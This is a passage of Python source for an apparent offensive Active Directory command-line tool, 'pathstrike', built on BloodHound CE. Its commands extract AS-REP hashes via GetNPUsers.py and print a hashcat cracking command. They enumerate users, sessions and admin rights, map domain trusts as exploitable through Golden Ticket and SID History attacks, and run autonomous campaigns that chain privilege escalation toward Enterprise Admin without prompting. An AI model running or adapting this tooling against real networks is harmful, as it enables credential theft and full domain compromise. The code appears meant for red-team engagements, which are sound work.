        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Step 1: Discover
            console.print(f"[bold]Querying BH CE for AS-REP roastable users in {domain.upper()}...[/]")
            users = await discover_asrep_roastable_users(client, domain)

            if not users:
                console.print("[yellow]No AS-REP roastable users found.[/]")
                return

            console.print(f"Found [bold green]{len(users)}[/] AS-REP roastable user(s):\n")
            for u in users:
                console.print(f"  - {u['name']}")
            console.print()

            # Step 2: Attack
            console.print("[bold]Extracting AS-REP hashes via GetNPUsers.py...[/]\n")
            hashes = await run_asreproast(cfg, target_users=users)

            if not hashes:
                console.print("[yellow]No AS-REP hashes extracted.[/]")
                return

            console.print(f"[bold green]Extracted {len(hashes)} AS-REP hash(es):[/]\n")
            for h in hashes:
                console.print(f"[dim]{h['hash'][:120]}...[/]")

            # Step 3: Output
            if output:
                with open(output, "w") as fh:
                    for h in hashes:
                        fh.write(h["hash"] + "\n")
                console.print(f"\n[green]Hashes written to {output}[/]")
                console.print(f"Crack with: [bold]hashcat -m 18200 {output} wordlist.txt[/]")
            else:
                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
                console.print("[bold]hashcat -m 18200 hashes.txt wordlist.txt[/]")

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def domains(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """List all AD domains discovered by BloodHound CE.

    Shows domain names, SIDs, and data collection timestamps.
    Auto-detects available targets for attack planning.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            raw_domains = await client.get_available_domains()

            if not raw_domains:
                console.print("[yellow]No domains found in BloodHound CE.[/]")
                return

            table = Table(title="Discovered Domains")
            table.add_column("Domain", style="green")
            table.add_column("ID / SID", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Collected", style="dim")

            for d in raw_domains:
                name = d.get("name", d.get("label", "Unknown"))
                sid = d.get("id", d.get("objectid", ""))
                dtype = d.get("type", "AD")
                collected = d.get("collected", d.get("last_collected", ""))
                table.add_row(name, sid, dtype, str(collected))

            console.print(table)
            console.print(
                f"\n[dim]Configure target domain in pathstrike.yaml → domain.name[/]"
            )

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def recon(
    target: Annotated[
        str,
        typer.Argument(help="Target principal name (e.g. USER@DOMAIN.LOCAL or COMPUTER$@DOMAIN.LOCAL)"),
    ],
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Enumerate detailed information about a target from BloodHound CE.

    Pulls entity details, group memberships, admin rights, sessions,
    and other intelligence from the BH CE API.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Search for the target
            console.print(f"[bold]Looking up: {target}[/]\n")
            search_result = await client.get_entity(target.upper())

            data = search_result.get("data", [])
            if not data:
                console.print(f"[yellow]No results found for '{target}'[/]")
                return

            # Display basic info
            for item in data if isinstance(data, list) else [data]:
                name = item.get("name", target)
                otype = item.get("type", item.get("kind", "Unknown"))
                oid = item.get("objectid", "")

                console.print(f"[bold green]{name}[/] ({otype})")
                console.print(f"  Object ID: {oid}")

                props = item.get("properties", item)
                for key in ["description", "displayname", "email",
                            "enabled", "admincount", "hasspn",
                            "dontreqpreauth", "pwdlastset",
                            "lastlogon", "lastlogontimestamp",
                            "owned", "highvalue"]:
                    val = props.get(key)
                    if val is not None:
                        console.print(f"  {key}: {val}")

                # Fetch detailed info based on type
                if otype.lower() == "user" and oid:
                    console.print("\n[bold]Group Memberships:[/]")
                    try:
                        memberships = await client.get_user_memberships(oid)
                        members_data = memberships.get("data", [])
                        if members_data:
                            for m in members_data[:20]:
                                mname = m.get("name", m.get("label", ""))
                                console.print(f"  - {mname}")
                        else:
                            console.print("  [dim]None found[/]")
                    except Exception:
                        console.print("  [dim]Could not fetch[/]")

                    console.print("\n[bold]Admin Rights:[/]")
                    try:
                        admin = await client.get_user_admin_rights(oid)
                        admin_data = admin.get("data", [])
                        if admin_data:
                            for a in admin_data[:20]:
                                aname = a.get("name", a.get("label", ""))
                                console.print(f"  - {aname}")
                        else:
                            console.print("  [dim]None found[/]")
                    except Exception:
                        console.print("  [dim]Could not fetch[/]")

                    console.print("\n[bold]Sessions:[/]")
                    try:
                        sessions = await client.get_user_sessions(oid)
                        sess_data = sessions.get("data", [])
                        if sess_data:
                            for s in sess_data[:20]:
                                sname = s.get("name", s.get("label", ""))
                                console.print(f"  - {sname}")
                        else:
                            console.print("  [dim]None found[/]")
                    except Exception:
                        console.print("  [dim]Could not fetch[/]")

                elif otype.lower() == "computer" and oid:
                    console.print("\n[bold]Local Admins:[/]")
                    try:
                        admins = await client.get_computer_admins(oid)
                        admin_data = admins.get("data", [])
                        if admin_data:
                            for a in admin_data[:20]:
                                aname = a.get("name", a.get("label", ""))
                                console.print(f"  - {aname}")
                        else:
                            console.print("  [dim]None found[/]")
                    except Exception:
                        console.print("  [dim]Could not fetch[/]")

                    console.print("\n[bold]Sessions:[/]")
                    try:
                        sessions = await client.get_computer_sessions(oid)
                        sess_data = sessions.get("data", [])
                        if sess_data:
                            for s in sess_data[:20]:
                                sname = s.get("name", s.get("label", ""))
                                console.print(f"  - {sname}")
                        else:
                            console.print("  [dim]None found[/]")
                    except Exception:
                        console.print("  [dim]Could not fetch[/]")

                console.print()

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def auto(
    config: ConfigOption = None,
    mode: Annotated[
        ExecutionMode,
        typer.Option("--mode", "-m", help="Execution mode"),
    ] = ExecutionMode.interactive,
    output: Annotated[
        Optional[Path],
        typer.Option("--output", "-o", help="Export results to file"),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Auto-discover and exploit attack paths using BH CE's analysis engine.

    Queries BloodHound CE's pre-analyzed attack path findings, ranks
    them by severity, and offers to exploit the highest-value paths
    automatically.

    This is the zero-configuration mode — no need to specify source
    or target. BH CE identifies the attack paths for you.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    async def _run() -> bool:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Step 1: Get available domains
            console.print("[bold]Querying BH CE for available domains...[/]")
            raw_domains = await client.get_available_domains()

            if not raw_domains:
                console.print("[red]No domains found in BH CE.[/]")
                return False

            for d in raw_domains:
                console.print(
                    f"  Domain: [green]{d.get('name', 'Unknown')}[/] "
                    f"(ID: {d.get('id', 'N/A')})"
                )

            # Step 2: Get attack path findings
            console.print("\n[bold]Querying BH CE for pre-analyzed attack paths...[/]")

            try:
                findings = await client.get_attack_path_findings()
            except Exception as exc:
                console.print(f"[yellow]Could not fetch attack path findings: {exc}[/]")
                console.print("[dim]Falling back to Cypher-based path discovery...[/]\n")
                # Fallback to standard pathfinding
                source_name = _build_source_name(None, cfg)
                target_name = _build_target_name(cfg)
                query, params = build_shortest_path_query(
                    source_name, target_name, cfg.domain.name,
                )
                response = await client.cypher_query(query, params)
                discovered = parse_cypher_response(response)
                if not discovered:
                    console.print("[yellow]No attack paths found.[/]")
                    return False
                console.print(f"Found [green]{len(discovered)}[/] path(s) via Cypher.\n")
                # Execute first path
                path = discovered[0]
                cred_store = _seed_credential_store(cfg)
                rollback_mgr = RollbackManager(cfg)
                orchestrator = AttackOrchestrator(
                    config=cfg,
                    cred_store=cred_store,
                    rollback_mgr=rollback_mgr,
                    verbose=verbose,
                )
                return await orchestrator.execute_path(path, mode)

            # Display findings
            finding_data = findings.get("data", [])
            if not finding_data:
                console.print("[yellow]No attack path findings from BH CE analysis.[/]")
                console.print(
                    "[dim]Run BH CE analysis first, or use 'pathstrike attack' "
                    "for Cypher-based discovery.[/]"
                )
                return False

            table = Table(title="BH CE Attack Path Findings")
            table.add_column("#", style="bold")
            table.add_column("Finding", style="green")
            table.add_column("Severity", style="red")
            table.add_column("Domain", style="cyan")
            table.add_column("Principals", style="yellow")

            for i, finding in enumerate(finding_data[:20], 1):
                table.add_row(
                    str(i),
                    str(finding.get("finding_type", finding.get("type", "Unknown"))),
                    str(finding.get("severity", finding.get("risk", "N/A"))),
                    str(finding.get("domain_name", finding.get("domain", ""))),
                    str(finding.get("principal_count", finding.get("impacted_count", "N/A"))),
                )

            console.print(table)
            console.print(
                f"\n[bold]{len(finding_data)} finding(s) total.[/] "
                "Use [bold]pathstrike attack[/] to exploit specific paths."
            )
            return True

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def credentials(
    config: ConfigOption = None,
) -> None:
    """Interactively update credentials in the config file.

    Prompts for username, password, domain, and DC host.
    Press Enter to keep the current value.
    """
    import yaml

    # Locate config file
    config_path = config
    if config_path is None:
        config_path = find_config()
        if config_path is None:
            console.print("[bold red]No config file found.[/]")
            raise typer.Exit(code=1)

    config_path = Path(config_path).expanduser().resolve()
    console.print(f"[dim]Editing:[/] {config_path}\n")

    # Load raw YAML (preserve structure)
    with open(config_path, "r") as fh:
        raw = yaml.safe_load(fh)

    creds = raw.get("credentials", {})
    domain_cfg = raw.get("domain", {})

    # Show current values and prompt for new ones
    cur_user = creds.get("username", "")
    cur_pass = creds.get("password", "")
    cur_domain = domain_cfg.get("name", "")
    cur_dc = domain_cfg.get("dc_host", "")
    cur_dc_fqdn = domain_cfg.get("dc_fqdn", "")

    console.print("[bold]Current credentials:[/]")
    console.print(f"  Username: [green]{cur_user}[/]")
    console.print(f"  Password: [green]{'*' * len(cur_pass) if cur_pass else '(none)'}[/]")
    console.print(f"  Domain:   [green]{cur_domain}[/]")
    console.print(f"  DC Host:  [green]{cur_dc}[/]")
    console.print(f"  DC FQDN:  [green]{cur_dc_fqdn}[/]")
    console.print("\n[dim]Press Enter to keep current value.[/]\n")

    new_user = typer.prompt("Username", default=cur_user).strip()
    new_pass = typer.prompt("Password", default=cur_pass).strip()
    new_domain = typer.prompt("Domain", default=cur_domain).strip()
    new_dc = typer.prompt("DC Host (IP)", default=cur_dc).strip()
    new_dc_fqdn = typer.prompt("DC FQDN", default=cur_dc_fqdn).strip()

    # Update raw config
    if "credentials" not in raw:
        raw["credentials"] = {}
    raw["credentials"]["username"] = new_user
    raw["credentials"]["password"] = new_pass

    if "domain" not in raw:
        raw["domain"] = {}
    raw["domain"]["name"] = new_domain
    raw["domain"]["dc_host"] = new_dc
    if new_dc_fqdn:
        raw["domain"]["dc_fqdn"] = new_dc_fqdn

    # Write back
    with open(config_path, "w") as fh:
        yaml.dump(raw, fh, default_flow_style=False, sort_keys=False)

    console.print(f"\n[bold green]Config updated:[/] {config_path}")
    console.print(f"  Username: [green]{new_user}[/]")
    console.print(f"  Domain:   [green]{new_domain}[/]")
    console.print(f"  DC Host:  [green]{new_dc}[/]")


@app.command()
def trusts(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Enumerate domain trust relationships from BloodHound CE.

    Queries the BH CE graph for all ``TrustedBy`` edges between Domain
    nodes and displays the trust map.  Identifies child→parent trusts
    that are exploitable via Golden Ticket with SID History injection.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    from pathstrike.bloodhound.cypher import build_trust_map_query

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            console.print("[bold]Querying BH CE for domain trusts...[/]\n")
            query, _ = build_trust_map_query()

            try:
                response = await client.cypher_query(query)
            except Exception as exc:
                console.print(f"[red]Cypher query failed: {exc}[/]")
                return

            raw_data = response.get("data", {})
            if not raw_data:
                console.print("[yellow]No trust relationships found.[/]")
                return

            # Parse nodes and edges
            nodes_data = {}
            edges_data = []
            if isinstance(raw_data, dict):
                nodes_data = raw_data.get("nodes", {})
                edges_data = raw_data.get("edges", [])
            elif isinstance(raw_data, list):
                for row in raw_data:
                    if isinstance(row, dict):
                        nodes_data.update(row.get("nodes", {}))
                        edges_data.extend(row.get("edges", []))

            # Build node lookup
            node_map = {}
            for nid, ndata in nodes_data.items():
                props = {**ndata}
                inner = ndata.get("properties", {})
                if isinstance(inner, dict):
                    props.update(inner)
                node_map[nid] = {
                    "name": props.get("name", props.get("label", "Unknown")),
                    "sid": props.get("objectId", props.get("objectid", "")),
                }

            table = Table(title="Domain Trust Map")
            table.add_column("Source Domain", style="green")
            table.add_column("", style="bold")
            table.add_column("Target Domain", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Exploitable", style="red")

            for edge in edges_data:
                src_id = str(edge.get("source", ""))
                tgt_id = str(edge.get("target", ""))
                src = node_map.get(src_id, {"name": src_id, "sid": ""})
                tgt = node_map.get(tgt_id, {"name": tgt_id, "sid": ""})

                src_name = src["name"]
                tgt_name = tgt["name"]

                # Get actual edge label from BH CE
                edge_label = edge.get("label", edge.get("kind", "Trust"))

                # Detect trust direction
                if src_name.upper().endswith(f".{tgt_name.upper()}"):
                    trust_type = "Child→Parent"
                    exploitable = "Golden Ticket + EA SID History"
                elif tgt_name.upper().endswith(f".{src_name.upper()}"):
                    trust_type = "Parent→Child"
                    exploitable = "Golden Ticket"
                else:
                    trust_type = "External/Forest"
                    exploitable = "Inter-realm TGT"

                table.add_row(
                    src_name,
                    f"{edge_label} →",
                    tgt_name,
                    trust_type,
                    exploitable,
                )

            console.print(table)
            console.print(
                f"\n[dim]Use [bold]pathstrike attack[/dim] to exploit "
                "discovered trust paths automatically.[/]"
            )

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def campaign(
    source: SourceOption = None,
    config: ConfigOption = None,
    mode: Annotated[
        ExecutionMode,
        typer.Option("--mode", "-m", help="Execution mode: interactive, auto, or dry_run"),
    ] = ExecutionMode.interactive,
    max_retries: Annotated[
        int,
        typer.Option("--max-retries", help="Max retries per step"),
    ] = -1,
    max_targets: Annotated[
        int,
        typer.Option("--max-targets", help="Max high-value targets to pursue per round"),
    ] = 10,
    no_time_sync: Annotated[
        bool,
        typer.Option("--no-time-sync", help="Disable automatic ntpdate clock sync"),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Autonomous attack campaign — discover, rank, and chain ALL attack paths.

    Queries BloodHound CE for every reachable high-value target,
    ranks them by privilege value (Enterprise Admin → Domain Admin →
    Backup Operators → ...), and executes the highest-value paths
    automatically.

    After each successful escalation, re-queries from the new position
    to discover additional paths.  Automatically chains trust
    escalation (child→parent domain) when Domain Admin is reached.

    [bold green]Interactive mode[/] (default): shows ranked paths and asks
    before each execution.

    [bold yellow]Auto mode[/] (-m auto): fully autonomous — executes all
    paths by score without prompting.

    [bold cyan]Dry-run mode[/] (-m dry_run): discovers and ranks paths
    without executing anything.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    source_name = _build_source_name(source, cfg)

    retry_policy = _build_retry_policy(cfg)
    if max_retries >= 0:
        retry_policy.max_retries = max_retries

    if no_time_sync or not cfg.execution.auto_time_sync:
        from pathstrike.engine.error_handler import ErrorCategory
        retry_on = set(retry_policy.retry_on)
        retry_on.discard(ErrorCategory.TIME_SKEW)
        retry_policy.retry_on = frozenset(retry_on)

    console.print(
        f"[bold]Campaign Mode:[/] {mode.value}\n"
        f"[bold]Source:[/] {source_name}\n"
        f"[bold]Max targets per round:[/] {max_targets}\n"
        f"[bold]Max retries:[/] {retry_policy.max_retries}\n"
        f"[bold]Auto time sync:[/] {'disabled' if no_time_sync else 'enabled'}\n"
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            cred_store = _seed_credential_store(cfg)
            rollback_mgr = RollbackManager(cfg)

            from pathstrike.engine.campaign import CampaignOrchestrator

            campaign_orch = CampaignOrchestrator(
                config=cfg,
                bh_client=client,
                cred_store=cred_store,
                rollback_mgr=rollback_mgr,
                retry_policy=retry_policy,
                mode=mode,
                verbose=verbose,
                max_targets=max_targets,
            )

            result = await campaign_orch.run_campaign()

            if not result.targets_compromised and mode != ExecutionMode.dry_run:
                raise typer.Exit(code=1)

    try:
        asyncio.run(_run())
    except (ValueError, typer.Exit) as exc:
        if isinstance(exc, ValueError):
            console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


if __name__ == "__main__":
    app()
